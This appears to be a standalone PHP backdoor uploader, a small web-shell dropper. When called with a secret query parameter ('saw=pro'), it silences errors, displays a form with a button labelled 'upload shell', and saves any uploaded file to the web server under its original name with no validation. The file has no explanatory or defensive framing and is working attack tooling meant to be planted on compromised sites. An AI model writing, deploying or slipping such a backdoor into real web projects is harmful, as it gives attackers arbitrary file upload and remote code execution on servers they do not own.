<?php
error_reporting(0);
$system = $_GET['saw'];
if($system == 'pro'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>





